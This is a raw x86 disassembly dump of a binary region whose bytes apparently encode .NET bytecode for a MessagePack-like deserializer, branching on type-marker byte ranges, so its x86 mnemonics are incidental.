  40364c:	00 06                	add    %al,(%esi)
  40364e:	0b 07                	or     (%edi),%eax
  403650:	2d 10 06 6f 3d       	sub    $0x3d6f0610,%eax
  403655:	00 00                	add    %al,(%eax)
  403657:	06                   	push   %es
  403658:	0a 06                	or     (%esi),%al
  40365a:	09 6f 38             	or     %ebp,0x38(%edi)
  40365d:	00 00                	add    %al,(%eax)
  40365f:	06                   	push   %es
  403660:	2b 02                	sub    (%edx),%eax
  403662:	07                   	pop    %es
  403663:	0a 11                	or     (%ecx),%dl
  403665:	05 17 58 13 05       	add    $0x5135817,%eax
  40366a:	11 05 08 8e 69 17    	adc    %eax,0x17698e08
  403670:	59                   	pop    %ecx
  403671:	32 cf                	xor    %bh,%cl
  403673:	08 08                	or     %cl,(%eax)
  403675:	8e 69 17             	mov    0x17(%ecx),%gs
  403678:	59                   	pop    %ecx
  403679:	9a 0d 06 09 6f 3b 00 	lcall  $0x3b,$0x6f09060d
  403680:	00 06                	add    %al,(%esi)
  403682:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403685:	04 15                	add    $0x15,%al
  403687:	31 0e                	xor    %ecx,(%esi)
  403689:	06                   	push   %es
  40368a:	7b 26                	jnp    0x4036b2
  40368c:	00 00                	add    %al,(%eax)
  40368e:	04 11                	add    $0x11,%al
  403690:	04 6f                	add    $0x6f,%al
  403692:	59                   	pop    %ecx
  403693:	00 00                	add    %al,(%eax)
  403695:	0a 2a                	or     (%edx),%ch
  403697:	06                   	push   %es
  403698:	6f                   	outsl  %ds:(%esi),(%dx)
  403699:	3d 00 00 06 0a       	cmp    $0xa060000,%eax
  40369e:	06                   	push   %es
  40369f:	09 6f 38             	or     %ebp,0x38(%edi)
  4036a2:	00 00                	add    %al,(%eax)
  4036a4:	06                   	push   %es
  4036a5:	06                   	push   %es
  4036a6:	2a 00                	sub    (%eax),%al
  4036a8:	1b 30                	sbb    (%eax),%esi
  4036aa:	04 00                	add    $0x0,%al
  4036ac:	35 00 00 00 0f       	xor    $0xf000000,%eax
  4036b1:	00 00                	add    %al,(%eax)
  4036b3:	11 73 79             	adc    %esi,0x79(%ebx)
  4036b6:	00 00                	add    %al,(%eax)
  4036b8:	0a 0a                	or     (%edx),%cl
  4036ba:	03 28                	add    (%eax),%ebp
  4036bc:	a0 00 00 06 10       	mov    0x10060000,%al
  4036c1:	01 06                	add    %eax,(%esi)
  4036c3:	03 16                	add    (%esi),%edx
  4036c5:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4036cb:	00 0a                	add    %cl,(%edx)
  4036cd:	06                   	push   %es
  4036ce:	16                   	push   %ss
  4036cf:	6a 6f                	push   $0x6f
  4036d1:	4e                   	dec    %esi
  4036d2:	00 00                	add    %al,(%eax)
  4036d4:	0a 02                	or     (%edx),%al
  4036d6:	06                   	push   %es
  4036d7:	28 56 00             	sub    %dl,0x0(%esi)
  4036da:	00 06                	add    %al,(%esi)
  4036dc:	de 0a                	fimuls (%edx)
  4036de:	06                   	push   %es
  4036df:	2c 06                	sub    $0x6,%al
  4036e1:	06                   	push   %es
  4036e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4036e3:	33 00                	xor    (%eax),%eax
  4036e5:	00 0a                	add    %cl,(%edx)
  4036e7:	dc 2a                	fsubrl (%edx)
  4036e9:	00 00                	add    %al,(%eax)
  4036eb:	00 01                	add    %al,(%ecx)
  4036ed:	10 00                	adc    %al,(%eax)
  4036ef:	00 02                	add    %al,(%edx)
  4036f1:	00 06                	add    %al,(%esi)
  4036f3:	00 24 2a             	add    %ah,(%edx,%ebp,1)
  4036f6:	00 0a                	add    %cl,(%edx)
  4036f8:	00 00                	add    %al,(%eax)
  4036fa:	00 00                	add    %al,(%eax)
  4036fc:	13 30                	adc    (%eax),%esi
  4036fe:	02 00                	add    (%eax),%al
  403700:	16                   	push   %ss
  403701:	00 00                	add    %al,(%eax)
  403703:	00 10                	add    %dl,(%eax)
  403705:	00 00                	add    %al,(%eax)
  403707:	11 03                	adc    %eax,(%ebx)
  403709:	19 73 77             	sbb    %esi,0x77(%ebx)
  40370c:	00 00                	add    %al,(%eax)
  40370e:	0a 0a                	or     (%edx),%cl
  403710:	02 06                	add    (%esi),%al
  403712:	28 56 00             	sub    %dl,0x0(%esi)
  403715:	00 06                	add    %al,(%esi)
  403717:	06                   	push   %es
  403718:	6f                   	outsl  %ds:(%esi),(%dx)
  403719:	41                   	inc    %ecx
  40371a:	00 00                	add    %al,(%eax)
  40371c:	0a 2a                	or     (%edx),%ch
  40371e:	00 00                	add    %al,(%eax)
  403720:	13 30                	adc    (%eax),%esi
  403722:	04 00                	add    $0x0,%al
  403724:	83 05 00 00 0a 00 00 	addl   $0x0,0xa0000
  40372b:	11 03                	adc    %eax,(%ebx)
  40372d:	6f                   	outsl  %ds:(%esi),(%dx)
  40372e:	7a 00                	jp     0x403730
  403730:	00 0a                	add    %cl,(%edx)
  403732:	d2 0a                	rorb   %cl,(%edx)
  403734:	14 0b                	adc    $0xb,%al
  403736:	16                   	push   %ss
  403737:	0c 16                	or     $0x16,%al
  403739:	0d 06 1f 7f 30       	or     $0x307f1f06,%eax
  40373e:	09 02                	or     %eax,(%edx)
  403740:	06                   	push   %es
  403741:	6e                   	outsb  %ds:(%esi),(%dx)
  403742:	28 42 00             	sub    %al,0x0(%edx)
  403745:	00 06                	add    %al,(%esi)
  403747:	2a 06                	sub    (%esi),%al
  403749:	20 80 00 00 00 32    	and    %al,0x32000000(%eax)
  40374f:	42                   	inc    %edx
  403750:	06                   	push   %es
  403751:	20 8f 00 00 00 30    	and    %cl,0x30000000(%edi)
  403757:	3a 02                	cmp    (%edx),%al
  403759:	28 39                	sub    %bh,(%ecx)
  40375b:	00 00                	add    %al,(%eax)
  40375d:	06                   	push   %es
  40375e:	02 18                	add    (%eax),%bl
  403760:	7d 24                	jge    0x403786
  403762:	00 00                	add    %al,(%eax)
  403764:	04 06                	add    $0x6,%al
  403766:	20 80 00 00 00 59    	and    %al,0x59000000(%eax)
  40376c:	0c 16                	or     $0x16,%al
  40376e:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403773:	3a 00                	cmp    (%eax),%al
  403775:	00 06                	add    %al,(%esi)
  403777:	25 03 28 64 00       	and    $0x642803,%eax
  40377c:	00 06                	add    %al,(%esi)
  40377e:	6f                   	outsl  %ds:(%esi),(%dx)
  40377f:	38 00                	cmp    %al,(%eax)
  403781:	00 06                	add    %al,(%esi)
  403783:	03 6f 56             	add    0x56(%edi),%ebp
  403786:	00 00                	add    %al,(%eax)
  403788:	06                   	push   %es
  403789:	09 17                	or     %edx,(%edi)
  40378b:	58                   	pop    %eax
  40378c:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403791:	2a 06                	sub    (%esi),%al
  403793:	20 90 00 00 00 32    	and    %dl,0x32000000(%eax)
  403799:	36 06                	ss push %es
  40379b:	20 9f 00 00 00 30    	and    %bl,0x30000000(%edi)
  4037a1:	2e 02 28             	add    %cs:(%eax),%ch
  4037a4:	39 00                	cmp    %eax,(%eax)
  4037a6:	00 06                	add    %al,(%esi)
  4037a8:	02 19                	add    (%ecx),%bl
  4037aa:	7d 24                	jge    0x4037d0
  4037ac:	00 00                	add    %al,(%eax)
  4037ae:	04 06                	add    $0x6,%al
  4037b0:	20 90 00 00 00 59    	and    %dl,0x59000000(%eax)
  4037b6:	0c 16                	or     $0x16,%al
  4037b8:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  4037bd:	3a 00                	cmp    (%eax),%al
  4037bf:	00 06                	add    %al,(%esi)
  4037c1:	03 6f 56             	add    0x56(%edi),%ebp
  4037c4:	00 00                	add    %al,(%eax)
  4037c6:	06                   	push   %es
  4037c7:	09 17                	or     %edx,(%edi)
  4037c9:	58                   	pop    %eax
  4037ca:	0d 09 08 32 ec       	or     $0xec320809,%eax
  4037cf:	2a 06                	sub    (%esi),%al
  4037d1:	20 a0 00 00 00 32    	and    %ah,0x32000000(%eax)
  4037d7:	1e                   	push   %ds
  4037d8:	06                   	push   %es
  4037d9:	20 bf 00 00 00 30    	and    %bh,0x30000000(%edi)
  4037df:	16                   	push   %ss
  4037e0:	06                   	push   %es
  4037e1:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  4037e7:	0c 02                	or     $0x2,%al
  4037e9:	03 08                	add    (%eax),%ecx
  4037eb:	28 63 00             	sub    %ah,0x0(%ebx)
  4037ee:	00 06                	add    %al,(%esi)
  4037f0:	28 4f 00             	sub    %cl,0x0(%edi)
  4037f3:	00 06                	add    %al,(%esi)
  4037f5:	2a 06                	sub    (%esi),%al
  4037f7:	20 e0                	and    %ah,%al
  4037f9:	00 00                	add    %al,(%eax)
  4037fb:	00 32                	add    %dh,(%edx)
  4037fd:	12 06                	adc    (%esi),%al
  4037ff:	20 ff                	and    %bh,%bh
  403801:	00 00                	add    %al,(%eax)
  403803:	00 30                	add    %dh,(%eax)
  403805:	0a 02                	or     (%edx),%al
  403807:	06                   	push   %es
  403808:	67 6a 28             	addr16 push $0x28
  40380b:	42                   	inc    %edx
  40380c:	00 00                	add    %al,(%eax)
  40380e:	06                   	push   %es
  40380f:	2a 06                	sub    (%esi),%al
  403811:	20 c0                	and    %al,%al
  403813:	00 00                	add    %al,(%eax)
  403815:	00 33                	add    %dh,(%ebx)
  403817:	07                   	pop    %es
  403818:	02 28                	add    (%eax),%ch
  40381a:	4e                   	dec    %esi
  40381b:	00 00                	add    %al,(%eax)
  40381d:	06                   	push   %es
  40381e:	2a 06                	sub    (%esi),%al
  403820:	20 c1                	and    %al,%cl
  403822:	00 00                	add    %al,(%eax)
  403824:	00 33                	add    %dh,(%ebx)
  403826:	0b 72 db             	or     -0x25(%edx),%esi
  403829:	20 00                	and    %al,(%eax)
  40382b:	70 73                	jo     0x4038a0
  40382d:	7b 00                	jnp    0x40382f
  40382f:	00 0a                	add    %cl,(%edx)
  403831:	7a 06                	jp     0x403839
  403833:	20 c2                	and    %al,%dl
  403835:	00 00                	add    %al,(%eax)
  403837:	00 33                	add    %dh,(%ebx)
  403839:	08 02                	or     %al,(%edx)
  40383b:	16                   	push   %ss
  40383c:	28 51 00             	sub    %dl,0x0(%ecx)
  40383f:	00 06                	add    %al,(%esi)
  403841:	2a 06                	sub    (%esi),%al
  403843:	20 c3                	and    %al,%bl
  403845:	00 00                	add    %al,(%eax)
  403847:	00 33                	add    %dh,(%ebx)
  403849:	08 02                	or     %al,(%edx)
  40384b:	17                   	pop    %ss
  40384c:	28 51 00             	sub    %dl,0x0(%ecx)
  40384f:	00 06                	add    %al,(%esi)
  403851:	2a 06                	sub    (%esi),%al
  403853:	20 c4                	and    %al,%ah
  403855:	00 00                	add    %al,(%eax)
  403857:	00 33                	add    %dh,(%ebx)
  403859:	20 03                	and    %al,(%ebx)
  40385b:	6f                   	outsl  %ds:(%esi),(%dx)
  40385c:	7a 00                	jp     0x40385e
  40385e:	00 0a                	add    %cl,(%edx)
  403860:	0c 08                	or     $0x8,%al
  403862:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403866:	01 0b                	add    %ecx,(%ebx)
  403868:	03 07                	add    (%edi),%eax
  40386a:	16                   	push   %ss
  40386b:	08 6f 45             	or     %ch,0x45(%edi)
  40386e:	00 00                	add    %al,(%eax)
  403870:	0a 26                	or     (%esi),%ah
  403872:	02 07                	add    (%edi),%al
  403874:	28 47 00             	sub    %al,0x0(%edi)
  403877:	00 06                	add    %al,(%esi)
  403879:	2a 06                	sub    (%esi),%al
  40387b:	20 c5                	and    %al,%ch
  40387d:	00 00                	add    %al,(%eax)
  40387f:	00 33                	add    %dh,(%ebx)
  403881:	39 18                	cmp    %ebx,(%eax)
  403883:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  403887:	01 0b                	add    %ecx,(%ebx)
  403889:	03 07                	add    (%edi),%eax
  40388b:	16                   	push   %ss
  40388c:	18 6f 45             	sbb    %ch,0x45(%edi)
  40388f:	00 00                	add    %al,(%eax)
  403891:	0a 26                	or     (%esi),%ah
  403893:	07                   	pop    %es
  403894:	28 26                	sub    %ah,(%esi)
  403896:	00 00                	add    %al,(%eax)
  403898:	06                   	push   %es
  403899:	0b 07                	or     (%edi),%eax
  40389b:	16                   	push   %ss
  40389c:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4038a0:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038a3:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038a7:	01 0b                	add    %ecx,(%ebx)
  4038a9:	03 07                	add    (%edi),%eax
  4038ab:	16                   	push   %ss
  4038ac:	08 6f 45             	or     %ch,0x45(%edi)
  4038af:	00 00                	add    %al,(%eax)
  4038b1:	0a 26                	or     (%esi),%ah
  4038b3:	02 07                	add    (%edi),%al
  4038b5:	28 47 00             	sub    %al,0x0(%edi)
  4038b8:	00 06                	add    %al,(%esi)
  4038ba:	2a 06                	sub    (%esi),%al
  4038bc:	20 c6                	and    %al,%dh
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	00 33                	add    %dh,(%ebx)
  4038c2:	39 1a                	cmp    %ebx,(%edx)
  4038c4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038c8:	01 0b                	add    %ecx,(%ebx)
  4038ca:	03 07                	add    (%edi),%eax
  4038cc:	16                   	push   %ss
  4038cd:	1a 6f 45             	sbb    0x45(%edi),%ch
  4038d0:	00 00                	add    %al,(%eax)
  4038d2:	0a 26                	or     (%esi),%ah
  4038d4:	07                   	pop    %es
  4038d5:	28 26                	sub    %ah,(%esi)
  4038d7:	00 00                	add    %al,(%eax)
  4038d9:	06                   	push   %es
  4038da:	0b 07                	or     (%edi),%eax
  4038dc:	16                   	push   %ss
  4038dd:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4038e1:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038e4:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4038e8:	01 0b                	add    %ecx,(%ebx)
  4038ea:	03 07                	add    (%edi),%eax
  4038ec:	16                   	push   %ss
  4038ed:	08 6f 45             	or     %ch,0x45(%edi)
  4038f0:	00 00                	add    %al,(%eax)
  4038f2:	0a 26                	or     (%esi),%ah
  4038f4:	02 07                	add    (%edi),%al
  4038f6:	28 47 00             	sub    %al,0x0(%edi)
  4038f9:	00 06                	add    %al,(%esi)
  4038fb:	2a 06                	sub    (%esi),%al
  4038fd:	20 c7                	and    %al,%bh
  4038ff:	00 00                	add    %al,(%eax)
  403901:	00 2e                	add    %ch,(%esi)
  403903:	10 06                	adc    %al,(%esi)
  403905:	20 c8                	and    %cl,%al
  403907:	00 00                	add    %al,(%eax)
  403909:	00 2e                	add    %ch,(%esi)
  40390b:	08 06                	or     %al,(%esi)
  40390d:	20 c9                	and    %cl,%cl
  40390f:	00 00                	add    %al,(%eax)
  403911:	00 33                	add    %dh,(%ebx)
  403913:	0b 72 07             	or     0x7(%edx),%esi
  403916:	21 00                	and    %eax,(%eax)
  403918:	70 73                	jo     0x40398d
  40391a:	7b 00                	jnp    0x40391c
  40391c:	00 0a                	add    %cl,(%edx)
  40391e:	7a 06                	jp     0x403926
  403920:	20 ca                	and    %cl,%dl
  403922:	00 00                	add    %al,(%eax)
  403924:	00 33                	add    %dh,(%ebx)
  403926:	26 1a 8d 44 00 00 01 	sbb    %es:0x1000044(%ebp),%cl
  40392d:	0b 03                	or     (%ebx),%eax
  40392f:	07                   	pop    %es
  403930:	16                   	push   %ss
  403931:	1a 6f 45             	sbb    0x45(%edi),%ch
  403934:	00 00                	add    %al,(%eax)
  403936:	0a 26                	or     (%esi),%ah
  403938:	07                   	pop    %es
  403939:	28 26                	sub    %ah,(%esi)
  40393b:	00 00                	add    %al,(%eax)
  40393d:	06                   	push   %es
  40393e:	0b 02                	or     (%edx),%eax
  403940:	07                   	pop    %es
  403941:	16                   	push   %ss
  403942:	28 7d 00             	sub    %bh,0x0(%ebp)
  403945:	00 0a                	add    %cl,(%edx)
  403947:	28 52 00             	sub    %dl,0x0(%edx)
  40394a:	00 06                	add    %al,(%esi)
  40394c:	2a 06                	sub    (%esi),%al
  40394e:	20 cb                	and    %cl,%bl
  403950:	00 00                	add    %al,(%eax)
  403952:	00 33                	add    %dh,(%ebx)
  403954:	26 1e                	es push %ds
  403956:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40395a:	01 0b                	add    %ecx,(%ebx)
  40395c:	03 07                	add    (%edi),%eax
  40395e:	16                   	push   %ss
  40395f:	1e                   	push   %ds
  403960:	6f                   	outsl  %ds:(%esi),(%dx)
  403961:	45                   	inc    %ebp
  403962:	00 00                	add    %al,(%eax)
  403964:	0a 26                	or     (%esi),%ah
  403966:	07                   	pop    %es
  403967:	28 26                	sub    %ah,(%esi)
  403969:	00 00                	add    %al,(%eax)
  40396b:	06                   	push   %es
  40396c:	0b 02                	or     (%edx),%eax
  40396e:	07                   	pop    %es
  40396f:	16                   	push   %ss
  403970:	28 7e 00             	sub    %bh,0x0(%esi)
  403973:	00 0a                	add    %cl,(%edx)
  403975:	28 53 00             	sub    %dl,0x0(%ebx)
  403978:	00 06                	add    %al,(%esi)
  40397a:	2a 06                	sub    (%esi),%al
  40397c:	20 cc                	and    %cl,%ah
  40397e:	00 00                	add    %al,(%eax)
  403980:	00 33                	add    %dh,(%ebx)
  403982:	11 03                	adc    %eax,(%ebx)
  403984:	6f                   	outsl  %ds:(%esi),(%dx)
  403985:	7a 00                	jp     0x403987
  403987:	00 0a                	add    %cl,(%edx)
  403989:	d2 0a                	rorb   %cl,(%edx)
  40398b:	02 06                	add    (%esi),%al
  40398d:	6e                   	outsb  %ds:(%esi),(%dx)
  40398e:	28 42 00             	sub    %al,0x0(%edx)
  403991:	00 06                	add    %al,(%esi)
  403993:	2a 06                	sub    (%esi),%al
  403995:	20 cd                	and    %cl,%ch
  403997:	00 00                	add    %al,(%eax)
  403999:	00 33                	add    %dh,(%ebx)
  40399b:	27                   	daa
  40399c:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  4039a2:	0b 03                	or     (%ebx),%eax
  4039a4:	07                   	pop    %es
  4039a5:	16                   	push   %ss
  4039a6:	18 6f 45             	sbb    %ch,0x45(%edi)
  4039a9:	00 00                	add    %al,(%eax)
  4039ab:	0a 26                	or     (%esi),%ah
  4039ad:	07                   	pop    %es
  4039ae:	28 26                	sub    %ah,(%esi)
  4039b0:	00 00                	add    %al,(%eax)
  4039b2:	06                   	push   %es
  4039b3:	0b 02                	or     (%edx),%eax
  4039b5:	07                   	pop    %es
  4039b6:	16                   	push   %ss
  4039b7:	28 7c 00 00          	sub    %bh,0x0(%eax,%eax,1)
  4039bb:	0a 6e 28             	or     0x28(%esi),%ch
  4039be:	42                   	inc    %edx
  4039bf:	00 00                	add    %al,(%eax)
  4039c1:	06                   	push   %es
  4039c2:	2a 06                	sub    (%esi),%al
  4039c4:	20 ce                	and    %cl,%dh
  4039c6:	00 00                	add    %al,(%eax)
  4039c8:	00 33                	add    %dh,(%ebx)
  4039ca:	27                   	daa
  4039cb:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  4039d1:	0b 03                	or     (%ebx),%eax
  4039d3:	07                   	pop    %es
  4039d4:	16                   	push   %ss
  4039d5:	1a 6f 45             	sbb    0x45(%edi),%ch
  4039d8:	00 00                	add    %al,(%eax)
  4039da:	0a 26                	or     (%esi),%ah
  4039dc:	07                   	pop    %es
  4039dd:	28 26                	sub    %ah,(%esi)
  4039df:	00 00                	add    %al,(%eax)
  4039e1:	06                   	push   %es
  4039e2:	0b 02                	or     (%edx),%eax
  4039e4:	07                   	pop    %es
  4039e5:	16                   	push   %ss
  4039e6:	28 7f 00             	sub    %bh,0x0(%edi)
  4039e9:	00 0a                	add    %cl,(%edx)
  4039eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4039ec:	28 42 00             	sub    %al,0x0(%edx)
  4039ef:	00 06                	add    %al,(%esi)
  4039f1:	2a 06                	sub    (%esi),%al
  4039f3:	20 cf                	and    %cl,%bh
  4039f5:	00 00                	add    %al,(%eax)
  4039f7:	00 33                	add    %dh,(%ebx)
  4039f9:	26 1e                	es push %ds
  4039fb:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4039ff:	01 0b                	add    %ecx,(%ebx)
  403a01:	03 07                	add    (%edi),%eax
  403a03:	16                   	push   %ss
  403a04:	1e                   	push   %ds
  403a05:	6f                   	outsl  %ds:(%esi),(%dx)
  403a06:	45                   	inc    %ebp
  403a07:	00 00                	add    %al,(%eax)
  403a09:	0a 26                	or     (%esi),%ah
  403a0b:	07                   	pop    %es
  403a0c:	28 26                	sub    %ah,(%esi)
  403a0e:	00 00                	add    %al,(%eax)
  403a10:	06                   	push   %es
  403a11:	0b 02                	or     (%edx),%eax
  403a13:	07                   	pop    %es
  403a14:	16                   	push   %ss
  403a15:	28 80 00 00 0a 28    	sub    %al,0x280a0000(%eax)
  403a1b:	43                   	inc    %ebx
  403a1c:	00 00                	add    %al,(%eax)
  403a1e:	06                   	push   %es
  403a1f:	2a 06                	sub    (%esi),%al
  403a21:	20 dc                	and    %bl,%ah
  403a23:	00 00                	add    %al,(%eax)
  403a25:	00 33                	add    %dh,(%ebx)
  403a27:	46                   	inc    %esi
  403a28:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403a2e:	0b 03                	or     (%ebx),%eax
  403a30:	07                   	pop    %es
  403a31:	16                   	push   %ss
  403a32:	18 6f 45             	sbb    %ch,0x45(%edi)
  403a35:	00 00                	add    %al,(%eax)
  403a37:	0a 26                	or     (%esi),%ah
  403a39:	07                   	pop    %es
  403a3a:	28 26                	sub    %ah,(%esi)
  403a3c:	00 00                	add    %al,(%eax)
  403a3e:	06                   	push   %es
  403a3f:	0b 07                	or     (%edi),%eax
  403a41:	16                   	push   %ss
  403a42:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a48:	02 28                	add    (%eax),%ch
  403a4a:	39 00                	cmp    %eax,(%eax)
  403a4c:	00 06                	add    %al,(%esi)
  403a4e:	02 19                	add    (%ecx),%bl
  403a50:	7d 24                	jge    0x403a76
  403a52:	00 00                	add    %al,(%eax)
  403a54:	04 16                	add    $0x16,%al
  403a56:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403a5b:	3a 00                	cmp    (%eax),%al
  403a5d:	00 06                	add    %al,(%esi)
  403a5f:	03 6f 56             	add    0x56(%edi),%ebp
  403a62:	00 00                	add    %al,(%eax)
  403a64:	06                   	push   %es
  403a65:	09 17                	or     %edx,(%edi)
  403a67:	58                   	pop    %eax
  403a68:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403a6d:	2a 06                	sub    (%esi),%al
  403a6f:	20 dd                	and    %bl,%ch
  403a71:	00 00                	add    %al,(%eax)
  403a73:	00 33                	add    %dh,(%ebx)
  403a75:	46                   	inc    %esi
  403a76:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403a7c:	0b 03                	or     (%ebx),%eax
  403a7e:	07                   	pop    %es
  403a7f:	16                   	push   %ss
  403a80:	1a 6f 45             	sbb    0x45(%edi),%ch
  403a83:	00 00                	add    %al,(%eax)
  403a85:	0a 26                	or     (%esi),%ah
  403a87:	07                   	pop    %es
  403a88:	28 26                	sub    %ah,(%esi)
  403a8a:	00 00                	add    %al,(%eax)
  403a8c:	06                   	push   %es
  403a8d:	0b 07                	or     (%edi),%eax
  403a8f:	16                   	push   %ss
  403a90:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403a96:	02 28                	add    (%eax),%ch
  403a98:	39 00                	cmp    %eax,(%eax)
  403a9a:	00 06                	add    %al,(%esi)
  403a9c:	02 19                	add    (%ecx),%bl
  403a9e:	7d 24                	jge    0x403ac4
  403aa0:	00 00                	add    %al,(%eax)
  403aa2:	04 16                	add    $0x16,%al
  403aa4:	0d 2b 10 02 28       	or     $0x2802102b,%eax
  403aa9:	3a 00                	cmp    (%eax),%al
  403aab:	00 06                	add    %al,(%esi)
  403aad:	03 6f 56             	add    0x56(%edi),%ebp
  403ab0:	00 00                	add    %al,(%eax)
  403ab2:	06                   	push   %es
  403ab3:	09 17                	or     %edx,(%edi)
  403ab5:	58                   	pop    %eax
  403ab6:	0d 09 08 32 ec       	or     $0xec320809,%eax
  403abb:	2a 06                	sub    (%esi),%al
  403abd:	20 d9                	and    %bl,%cl
  403abf:	00 00                	add    %al,(%eax)
  403ac1:	00 33                	add    %dh,(%ebx)
  403ac3:	0e                   	push   %cs
  403ac4:	02 06                	add    (%esi),%al
  403ac6:	03 28                	add    (%eax),%ebp
  403ac8:	65 00 00             	add    %al,%gs:(%eax)
  403acb:	06                   	push   %es
  403acc:	28 4f 00             	sub    %cl,0x0(%edi)
  403acf:	00 06                	add    %al,(%esi)
  403ad1:	2a 06                	sub    (%esi),%al
  403ad3:	20 de                	and    %bl,%dh
  403ad5:	00 00                	add    %al,(%eax)
  403ad7:	00 33                	add    %dh,(%ebx)
  403ad9:	52                   	push   %edx
  403ada:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403ae0:	0b 03                	or     (%ebx),%eax
  403ae2:	07                   	pop    %es
  403ae3:	16                   	push   %ss
  403ae4:	18 6f 45             	sbb    %ch,0x45(%edi)
  403ae7:	00 00                	add    %al,(%eax)
  403ae9:	0a 26                	or     (%esi),%ah
  403aeb:	07                   	pop    %es
  403aec:	28 26                	sub    %ah,(%esi)
  403aee:	00 00                	add    %al,(%eax)
  403af0:	06                   	push   %es
  403af1:	0b 07                	or     (%edi),%eax
  403af3:	16                   	push   %ss
  403af4:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403afa:	02 28                	add    (%eax),%ch
  403afc:	39 00                	cmp    %eax,(%eax)
  403afe:	00 06                	add    %al,(%esi)
  403b00:	02 18                	add    (%eax),%bl
  403b02:	7d 24                	jge    0x403b28
  403b04:	00 00                	add    %al,(%eax)
  403b06:	04 16                	add    $0x16,%al
  403b08:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b0d:	3a 00                	cmp    (%eax),%al
  403b0f:	00 06                	add    %al,(%esi)
  403b11:	25 03 28 64 00       	and    $0x642803,%eax
  403b16:	00 06                	add    %al,(%esi)
  403b18:	6f                   	outsl  %ds:(%esi),(%dx)
  403b19:	38 00                	cmp    %al,(%eax)
  403b1b:	00 06                	add    %al,(%esi)
  403b1d:	03 6f 56             	add    0x56(%edi),%ebp
  403b20:	00 00                	add    %al,(%eax)
  403b22:	06                   	push   %es
  403b23:	09 17                	or     %edx,(%edi)
  403b25:	58                   	pop    %eax
  403b26:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b2b:	2a 06                	sub    (%esi),%al
  403b2d:	20 de                	and    %bl,%dh
  403b2f:	00 00                	add    %al,(%eax)
  403b31:	00 33                	add    %dh,(%ebx)
  403b33:	52                   	push   %edx
  403b34:	18 8d 44 00 00 01    	sbb    %cl,0x1000044(%ebp)
  403b3a:	0b 03                	or     (%ebx),%eax
  403b3c:	07                   	pop    %es
  403b3d:	16                   	push   %ss
  403b3e:	18 6f 45             	sbb    %ch,0x45(%edi)
  403b41:	00 00                	add    %al,(%eax)
  403b43:	0a 26                	or     (%esi),%ah
  403b45:	07                   	pop    %es
  403b46:	28 26                	sub    %ah,(%esi)
  403b48:	00 00                	add    %al,(%eax)
  403b4a:	06                   	push   %es
  403b4b:	0b 07                	or     (%edi),%eax
  403b4d:	16                   	push   %ss
  403b4e:	28 81 00 00 0a 0c    	sub    %al,0xc0a0000(%ecx)
  403b54:	02 28                	add    (%eax),%ch
  403b56:	39 00                	cmp    %eax,(%eax)
  403b58:	00 06                	add    %al,(%esi)
  403b5a:	02 18                	add    (%eax),%bl
  403b5c:	7d 24                	jge    0x403b82
  403b5e:	00 00                	add    %al,(%eax)
  403b60:	04 16                	add    $0x16,%al
  403b62:	0d 2b 1c 02 28       	or     $0x28021c2b,%eax
  403b67:	3a 00                	cmp    (%eax),%al
  403b69:	00 06                	add    %al,(%esi)
  403b6b:	25 03 28 64 00       	and    $0x642803,%eax
  403b70:	00 06                	add    %al,(%esi)
  403b72:	6f                   	outsl  %ds:(%esi),(%dx)
  403b73:	38 00                	cmp    %al,(%eax)
  403b75:	00 06                	add    %al,(%esi)
  403b77:	03 6f 56             	add    0x56(%edi),%ebp
  403b7a:	00 00                	add    %al,(%eax)
  403b7c:	06                   	push   %es
  403b7d:	09 17                	or     %edx,(%edi)
  403b7f:	58                   	pop    %eax
  403b80:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  403b85:	2a 06                	sub    (%esi),%al
  403b87:	20 df                	and    %bl,%bh
  403b89:	00 00                	add    %al,(%eax)
  403b8b:	00 33                	add    %dh,(%ebx)
  403b8d:	52                   	push   %edx
  403b8e:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  403b94:	0b 03                	or     (%ebx),%eax
  403b96:	07                   	pop    %es
  403b97:	16                   	push   %ss
  403b98:	1a 6f 45             	sbb    0x45(%edi),%ch
  403b9b:	00 00                	add    %al,(%eax)
  403b9d:	0a 26                	or     (%esi),%ah
  403b9f:	07                   	pop    %es
  403ba0:	28 26                	sub    %ah,(%esi)
  403ba2:	00 00                	add    %al,(%eax)
  403ba4:	06                   	push   %es
  403ba5:	0b 07                	or     (%edi),%eax
  403ba7:	16                   	push   %ss
  403ba8:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403bac:	0a 0c 02             	or     (%edx,%eax,1),%cl
  403baf:	28 39                	sub    %bh,(%ecx)
  403bb1:	00 00                	add    %al,(%eax)
